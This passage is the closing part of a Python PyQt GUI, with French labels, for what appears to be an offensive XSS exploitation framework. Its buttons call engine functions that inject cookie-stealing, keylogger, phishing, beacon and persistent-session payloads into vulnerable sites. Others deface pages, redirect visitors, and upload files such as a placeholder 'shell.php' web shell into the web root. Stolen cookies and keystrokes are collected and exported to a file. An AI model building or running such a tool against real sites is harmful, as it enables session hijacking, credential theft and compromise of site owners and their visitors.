        history_layout = QVBoxLayout()
        self.download_history = QListWidget()
        history_layout.addWidget(self.download_history)
        history_group.setLayout(history_layout)
        layout.addWidget(history_group)
        
        return tab
    
    def create_upload_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        info = QLabel("📤 Upload vers le site (Moi → Site)")
        info.setStyleSheet("color: #8888aa; font-size: 14px;")
        layout.addWidget(info)
        
        upload_group = QGroupBox("🎯 Upload un fichier")
        upload_layout = QGridLayout()
        upload_layout.addWidget(QLabel("Fichier local:"), 0, 0)
        self.upload_local = QLineEdit()
        self.upload_local.setPlaceholderText("/home/user/shell.php")
        upload_layout.addWidget(self.upload_local, 0, 1)
        browse_btn = QPushButton("📂 Parcourir")
        browse_btn.clicked.connect(self.browse_local_file)
        upload_layout.addWidget(browse_btn, 0, 2)
        upload_layout.addWidget(QLabel("Chemin distant:"), 1, 0)
        self.upload_remote = QLineEdit()
        self.upload_remote.setPlaceholderText("/var/www/html/shell.php")
        upload_layout.addWidget(self.upload_remote, 1, 1, 1, 2)
        upload_btn = QPushButton("📤 Upload")
        upload_btn.setObjectName("success")
        upload_btn.clicked.connect(self.upload_file)
        upload_layout.addWidget(upload_btn, 2, 0, 1, 3)
        upload_group.setLayout(upload_layout)
        layout.addWidget(upload_group)
        
        history_group = QGroupBox("📋 Historique des uploads")
        history_layout = QVBoxLayout()
        self.upload_history = QListWidget()
        history_layout.addWidget(self.upload_history)
        history_group.setLayout(history_layout)
        layout.addWidget(history_group)
        
        return tab
    
    def create_stored_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        info = QLabel("💾 Test de XSS Stocké")
        info.setStyleSheet("color: #8888aa; font-size: 14px;")
        layout.addWidget(info)
        
        target_group = QGroupBox("🎯 Cible")
        target_layout = QGridLayout()
        target_layout.addWidget(QLabel("URL:"), 0, 0)
        self.stored_url = QLineEdit()
        self.stored_url.setPlaceholderText("https://example.com/comment.php")
        target_layout.addWidget(self.stored_url, 0, 1)
        target_layout.addWidget(QLabel("Champ:"), 1, 0)
        self.stored_field = QLineEdit()
        self.stored_field.setPlaceholderText("comment")
        target_layout.addWidget(self.stored_field, 1, 1)
        target_group.setLayout(target_layout)
        layout.addWidget(target_group)
        
        test_btn = QPushButton("🔍 Tester le XSS stocké")
        test_btn.setObjectName("primary")
        test_btn.clicked.connect(self.test_stored_xss)
        layout.addWidget(test_btn)
        
        results_group = QGroupBox("📊 Résultats")
        results_layout = QVBoxLayout()
        self.stored_results = QListWidget()
        results_layout.addWidget(self.stored_results)
        results_group.setLayout(results_layout)
        layout.addWidget(results_group)
        
        return tab
    
    def create_data_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        cookies_group = QGroupBox("🍪 Cookies capturés")
        cookies_layout = QVBoxLayout()
        self.cookies_table = QTableWidget(0, 3)
        self.cookies_table.setHorizontalHeaderLabels(["Cookie", "IP", "Heure"])
        cookies_layout.addWidget(self.cookies_table)
        cookies_group.setLayout(cookies_layout)
        layout.addWidget(cookies_group)
        
        keylogs_group = QGroupBox("⌨️ Keylogs")
        keylogs_layout = QVBoxLayout()
        self.keylogs_text = QTextEdit()
        self.keylogs_text.setReadOnly(True)
        self.keylogs_text.setFontFamily("Consolas")
        self.keylogs_text.setFontPointSize(12)
        keylogs_layout.addWidget(self.keylogs_text)
        keylogs_group.setLayout(keylogs_layout)
        layout.addWidget(keylogs_group)
        
        export_btn = QPushButton("💾 Exporter les données")
        export_btn.clicked.connect(self.export_data)
        layout.addWidget(export_btn)
        
        return tab
    
    def create_console_tab(self):
        tab = QWidget()
        layout = QVBoxLayout(tab)
        
        self.console = QTextEdit()
        self.console.setReadOnly(True)
        self.console.setFontFamily("Consolas")
        self.console.setFontPointSize(10)
        layout.addWidget(self.console)
        
        btn_layout = QHBoxLayout()
        clear_btn = QPushButton("🧹 Effacer")
        clear_btn.clicked.connect(self.clear_console)
        btn_layout.addWidget(clear_btn)
        btn_layout.addStretch()
        layout.addLayout(btn_layout)
        
        return tab
    
    def connect_signals(self):
        self.engine.status_changed.connect(self.update_status)
        self.engine.vuln_detected.connect(self.on_vuln_detected)
        self.engine.cookie_captured.connect(self.on_cookie_captured)
        self.engine.file_downloaded.connect(self.on_file_downloaded)
        self.engine.file_uploaded.connect(self.on_file_uploaded)
    
    def start_scan(self):
        url = self.url_input.text().strip()
        if not url:
            self.log("❌ Veuillez entrer une URL")
            return
        self.vuln_list.clear()
        self.vulnerabilities = []
        self.log(f"🔍 Scan de {url}")
        threading.Thread(target=self.scan_worker, args=(url,), daemon=True).start()
    
    def scan_worker(self, url):
        vulns = self.engine.scan_url(url)
        self.vulnerabilities = vulns
        for vuln in vulns:
            self.vuln_list.addItem(f"{vuln['param']} - {vuln['payload'][:30]}...")
    
    def on_vuln_selected(self, item):
        index = self.vuln_list.currentRow()
        if 0 <= index < len(self.vulnerabilities):
            vuln = self.vulnerabilities[index]
            self.current_vuln = vuln
            self.vuln_param.setText(vuln['param'])
            self.vuln_payload.setText(vuln['payload'][:50] + "...")
            self.log(f"🎯 Vulnérabilité sélectionnée: {vuln['param']}")
    
    def on_vuln_detected(self, param, payload, url):
        self.log(f"🚨 XSS trouvé sur {param}: {payload[:30]}...")
    
    def on_cookie_captured(self, cookie, ip, time):
        row = self.cookies_table.rowCount()
        self.cookies_table.insertRow(row)
        self.cookies_table.setItem(row, 0, QTableWidgetItem(cookie))
        self.cookies_table.setItem(row, 1, QTableWidgetItem(ip))
        self.cookies_table.setItem(row, 2, QTableWidgetItem(time))
        self.log(f"🍪 Cookie capturé: {cookie[:50]}...")
    
    def on_file_downloaded(self, file_path, status):
        self.download_history.addItem(f"📥 {file_path} - {status}")
    
    def on_file_uploaded(self, local_file, remote_path):
        self.upload_history.addItem(f"📤 {local_file} → {remote_path}")
    
    def start_server(self):
        port = int(self.port_input.text())
        self.engine.start_cookie_server(port)
        self.server_btn.setEnabled(False)
        self.stop_server_btn.setEnabled(True)
        self.log(f"🖥️ Serveur démarré sur le port {port}")
    
    def stop_server(self):
        if self.engine.cookie_server:
            self.engine.cookie_server.shutdown()
        self.server_btn.setEnabled(True)
        self.stop_server_btn.setEnabled(False)
        self.log("🛑 Serveur arrêté")
    
    def start_persistence(self):
        self.engine.start_persistence()
        self.persist_active = True
        self.persist_status.setText("🟢 ACTIVE")
        self.persist_status.setStyleSheet("color: #00ff88; font-size: 16px;")
        self.persist_start_btn.setEnabled(False)
        self.persist_stop_btn.setEnabled(True)
        self.log("🔄 Persistance ACTIVÉE")
        self.refresh_persist_payloads()
    
    def stop_persistence(self):
        self.engine.stop_persistence()
        self.persist_active = False
        self.persist_status.setText("🔴 INACTIVE")
        self.persist_status.setStyleSheet("color: #ff6666; font-size: 16px;")
        self.persist_start_btn.setEnabled(True)
        self.persist_stop_btn.setEnabled(False)
        self.log("🔄 Persistance DÉSACTIVÉE")
    
    def refresh_persist_payloads(self):
        self.persist_payloads_list.clear()
        payloads = self.engine.db.get_payloads()
        for payload in payloads:
            self.persist_payloads_list.addItem(f"{payload[1]} - {payload[2]} (exécuté {payload[7]} fois)")
    
    def download_file(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        file_path = self.download_path.text().strip()
        if not file_path:
            self.log("❌ Entrez un chemin de fichier")
            return
        self.engine.download_file_from_site(self.current_vuln, file_path)
        self.log(f"📥 Téléchargement de {file_path} initié")
    
    def browse_local_file(self):
        file_path, _ = QFileDialog.getOpenFileName(self, "Sélectionner un fichier")
        if file_path:
            self.upload_local.setText(file_path)
    
    def upload_file(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        local_file = self.upload_local.text().strip()
        remote_path = self.upload_remote.text().strip()
        if not local_file or not remote_path:
            self.log("❌ Remplissez tous les champs")
            return
        self.engine.upload_file_to_site(self.current_vuln, local_file, remote_path)
        self.log(f"📤 Upload de {local_file} vers {remote_path} initié")
    
    def test_stored_xss(self):
        url = self.stored_url.text().strip()
        field = self.stored_field.text().strip()
        if not url or not field:
            self.log("❌ URL et champ requis")
            return
        self.log(f"🔍 Test de XSS stocké sur {url}")
        form_data = {field: "test"}
        vulns = self.engine.scan_stored_xss(url, form_data)
        self.stored_results.clear()
        for vuln in vulns:
            self.stored_results.addItem(f"🚨 XSS STOCKÉ trouvé!")
            self.log(f"🚨 XSS STOCKÉ trouvé sur {url}")
    
    def steal_cookies(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        ip = self.ip_input.text()
        port = int(self.port_input.text())
        self.engine.create_persistent_payload(self.current_vuln, 'cookie_steal', ip, port)
        self.log("🍪 Injection de vol de cookies effectuée")
    
    def inject_phishing(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        ip = self.ip_input.text()
        port = int(self.port_input.text())
        self.engine.create_persistent_payload(self.current_vuln, 'phishing', ip, port)
        self.log("🎣 Formulaire de phishing injecté")
    
    def deface_page(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        self.engine.execute_payload(self.current_vuln, self.engine.exploit_payloads['deface'])
        self.log("🎨 Page défigurée")
    
    def redirect_to(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        self.engine.execute_payload(self.current_vuln, self.engine.exploit_payloads['redirect'])
        self.log("🔄 Redirection effectuée")
    
    def inject_keylogger(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        ip = self.ip_input.text()
        port = int(self.port_input.text())
        self.engine.create_persistent_payload(self.current_vuln, 'persistent_keylog', ip, port)
        self.log("⌨️ Keylogger injecté")
    
    def inject_persistent_session(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        ip = self.ip_input.text()
        port = int(self.port_input.text())
        self.engine.create_persistent_payload(self.current_vuln, 'persistent_session', ip, port)
        self.log("🔄 Session persistante injectée")
    
    def inject_beacon(self):
        if not self.current_vuln:
            self.log("❌ Sélectionnez une vulnérabilité d'abord")
            return
        ip = self.ip_input.text()
        port = int(self.port_input.text())
        self.engine.create_persistent_payload(self.current_vuln, 'beacon', ip, port)
        self.log("📡 Beacon injecté")
    
    def export_data(self):
        filename = f"xss_data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        data = {'cookies': [], 'keylogs': []}
        for row in range(self.cookies_table.rowCount()):
            data['cookies'].append({
                'cookie': self.cookies_table.item(row, 0).text(),
                'ip': self.cookies_table.item(row, 1).text(),
                'time': self.cookies_table.item(row, 2).text()
            })
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)
        self.log(f"✅ Données exportées dans {filename}")
    
    def log(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        self.console.append(f"[{timestamp}] {message}")
        self.console.verticalScrollBar().setValue(
            self.console.verticalScrollBar().maximum()
        )
    
    def clear_console(self):
        self.console.clear()
    
    def update_status(self, status):
        self.status_bar.showMessage(f"📡 {status}")
        self.log(status)

# ==================== MAIN ====================

def main():
    app = QApplication(sys.argv)
    app.setStyle('Fusion')
    window = XSSFrameworkGUI()
    window.show()
    sys.exit(app.exec())

if __name__ == "__main__":
    main()